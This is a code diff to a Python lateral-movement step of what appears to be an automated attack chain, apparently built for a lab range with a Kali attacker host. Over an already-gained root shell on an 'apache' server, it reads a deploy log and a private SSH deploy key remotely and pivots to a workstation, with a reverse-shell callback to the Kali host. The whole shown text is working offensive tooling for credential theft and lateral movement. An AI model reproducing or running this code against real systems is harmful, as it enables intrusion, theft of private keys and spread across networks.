@@ -138,7 +138,7 @@ def _fire_reverse_shell(root_shell, workstation_user, workstation_ip,
     send_command(root_shell, ssh_cmd)
 
 
-def run(root_shell, kali_host=KALI_HOST, workstation_ip=WORKSTATION_IP,
+def run(root_shell, kali_host=KALI_HOST, workstation_ip=None,
         workstation_user=WORKSTATION_USER, workstation_port=WORKSTATION_PORT):
     """
     Execute the lateral-movement step.
@@ -146,7 +146,8 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=WORKSTATION_IP,
     Args:
         root_shell (socket):    root shell on apache (from privesc step).
         kali_host (str):        kali IP for reverse-shell callback.
-        workstation_ip (str):   target workstation IP.
+        workstation_ip (str):   target workstation IP, or None to discover
+                                via deploy.log (standalone / fallback mode).
         workstation_user (str): SSH username on workstation.
         workstation_port (int): SSH port on workstation.
 
@@ -158,17 +159,23 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=WORKSTATION_IP,
     # ------------------------------------------------------------------
     # Phase 1 — Credential discovery: deploy.log + private key on apache
     # ------------------------------------------------------------------
-    print(f"[*] Reading deploy log: {DEPLOY_LOG_PATH}")
-    log_content = _run_remote(root_shell, f"cat {DEPLOY_LOG_PATH}")
-
-    match = re.search(r"([\w.]+)@(\d+\.\d+\.\d+\.\d+)", log_content)
-    if match:
-        workstation_user = match.group(1)
-        workstation_ip   = match.group(2)
-        print(f"[+] Found deploy identity: {workstation_user}@{workstation_ip}")
+    # workstation_ip=None  → parse deploy.log (standalone / --only lateral)
+    # workstation_ip=<ip>  → creds step already discovered it, skip parsing
+    if workstation_ip is not None:
+        print(f"[+] Using workstation IP from prior step: {workstation_user}@{workstation_ip}")
     else:
-        print(f"[!] Could not parse deploy.log; using defaults "
-              f"({workstation_user}@{workstation_ip})")
+        workstation_ip = WORKSTATION_IP   # set fallback before possible override below
+        print(f"[*] Reading deploy log: {DEPLOY_LOG_PATH}")
+        log_content = _run_remote(root_shell, f"cat {DEPLOY_LOG_PATH}")
+
+        match = re.search(r"([\w.]+)@(\d+\.\d+\.\d+\.\d+)", log_content)
+        if match:
+            workstation_user = match.group(1)
+            workstation_ip   = match.group(2)
+            print(f"[+] Found deploy identity: {workstation_user}@{workstation_ip}")
+        else:
+            print(f"[!] Could not parse deploy.log; using defaults "
+                  f"({workstation_user}@{workstation_ip})")
 
     print(f"[*] Reading deploy key: {REMOTE_KEY_PATH}")
     raw_key = _run_remote(root_shell, f"cat {REMOTE_KEY_PATH}", timeout=10)
